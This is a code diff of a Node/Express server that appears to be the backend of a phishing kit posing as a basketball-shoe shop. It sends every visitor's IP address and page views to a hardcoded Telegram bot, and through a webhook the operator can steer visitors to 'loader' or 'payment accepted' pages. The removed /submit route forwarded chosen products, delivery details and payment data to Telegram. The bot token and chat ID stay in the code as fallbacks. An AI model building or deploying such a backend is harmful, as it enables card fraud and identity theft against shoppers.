@@ -4,32 +4,39 @@ const path = require("path");
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "frontend")));
+app.use(express.static(path.join(__dirname, "frontend"))); // dossier frontend pour HTML/JS/CSS
 
-const BOT_TOKEN = "8208574276:AAF96EdGjUrQqkRrb31QjzqzqVJ9uMB5c";
-const CHAT_ID = "7747778364";
-const BASE_URL = "https://basketnew.onrender.com";
+// Variables d'environnement
+const BOT_TOKEN = process.env.BOT_TOKEN || "8208574276:AAF96EdGjUrQqkRrb31QjzqVJ9uMB5c";
+const CHAT_ID = process.env.CHAT_ID || "7747778364";
+const BASE_URL = process.env.BASE_URL || "https://basketnew.onrender.com";
 
-let userCommands = {};
-let userData = {};
+let userCommands = {}; // pour stocker les commandes depuis Telegram
 
+// Fonction pour envoyer un message Telegram avec clavier inline
 async function sendTelegramMessage(text, keyboard) {
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text,
-      parse_mode: "HTML",
-      reply_markup: keyboard,
-    }),
-  });
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text,
+        parse_mode: "HTML",
+        reply_markup: keyboard,
+      }),
+    });
+  } catch (err) {
+    console.error("Erreur envoi Telegram:", err);
+  }
 }
 
+// Route POST /visit pour chaque visite de page
 app.post("/visit", async (req, res) => {
   const { visitorId, page } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
+  // Clavier inline
   const keyboard = {
     inline_keyboard: [[
       { text: "🏠 Accueil", callback_data: `index_${visitorId}` },
@@ -45,51 +52,41 @@ app.post("/visit", async (req, res) => {
   res.json({ success: true });
 });
 
-app.post("/submit", async (req,res)=>{
-  const { visitorId, type, data } = req.body;
-  if(!userData[visitorId]) userData[visitorId]={};
-
-  if(type==='pair') userData[visitorId].pair=data.pair;
-  if(type==='info') userData[visitorId]={...userData[visitorId], ...data};
-  if(type==='payment') userData[visitorId].payment=data.payment;
-
-  let message=`👤 Visitor ID: ${visitorId}\n`;
-  if(type==='pair') message+=`🏀 Paire choisie: ${data.pair}`;
-  if(type==='info') message+=`📦 Infos livraison: ${JSON.stringify(data)}`;
-  if(type==='payment') message+=`💳 Paiement: ${JSON.stringify(data)}`;
-
-  const keyboard={inline_keyboard:[[ 
-    {text:"🏠 Accueil",callback_data:`index_${visitorId}`},
-    {text:"Loader",callback_data:`loader_${visitorId}`},
-    {text:"Paiement accepté",callback_data:`paymentok_${visitorId}`}
-  ]]};
-  await sendTelegramMessage(message,keyboard);
-  res.json({success:true});
-});
-
-app.get("/get-command",(req,res)=>{
+// Route GET /get-command pour récupérer la commande Telegram
+app.get("/get-command", (req, res) => {
   const { visitorId } = req.query;
-  const cmd=userCommands[visitorId]||null;
-  if(cmd) delete userCommands[visitorId];
-  res.json({command:cmd});
+  const command = userCommands[visitorId] || null;
+  if (command) delete userCommands[visitorId];
+  res.json({ command });
 });
 
-app.post("/webhook",async(req,res)=>{
-  const cb=req.body.callback_query;
-  if(!cb) return res.sendStatus(200);
-  const [page,visitorId]=cb.data.split("_");
-  userCommands[visitorId]=page;
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({callback_query_id:cb.id,text:`➡️ Page: ${page}`})
+// Route POST /webhook pour gérer les callbacks Telegram
+app.post("/webhook", async (req, res) => {
+  const cb = req.body.callback_query;
+  if (!cb) return res.sendStatus(200);
+
+  const [page, visitorId] = cb.data.split("_");
+  userCommands[visitorId] = page;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ callback_query_id: cb.id, text: `➡️ Page: ${page}` }),
   });
+
   res.sendStatus(200);
 });
 
-const PORT=process.env.PORT||3000;
-app.listen(PORT,async()=>{
+// Serveur
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, async () => {
   console.log(`✅ Serveur actif sur le port ${PORT}`);
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${BASE_URL}/webhook`);
-  console.log("📡 Webhook Telegram configuré !");
+
+  // Enregistrement automatique du webhook
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${BASE_URL}/webhook`);
+    console.log("📡 Webhook Telegram configuré !");
+  } catch (err) {
+    console.error("Erreur configuration webhook:", err);
+  }
 });
